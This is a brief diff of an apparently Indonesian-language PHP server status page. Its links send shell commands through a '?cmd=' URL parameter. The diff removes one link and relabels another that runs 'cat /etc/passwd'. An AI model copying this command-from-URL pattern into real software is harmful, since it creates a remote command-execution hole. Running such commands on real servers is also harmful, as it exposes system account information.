@@ -78,8 +78,7 @@ body {
 		<a href="?cmd=freebsd-version">Cek versi FreeBSD</a> &#8226; 
 		<a href="?cmd=df -h">Cek disk space</a> &#8226; 
 		<a href="?cmd=sysctl hw.model">Cek CPU</a> &#8226;  
-		<a href="?cmd=sysctgl hw.physmem">Cek RAM</a> &#8226;
-		<a href="?cmd=cat /etc/passwd">Cek User linux</a>
+		<a href="?cmd=cat /etc/passwd">Cek User FreeBSD</a>
 
 	</p>
 <?php
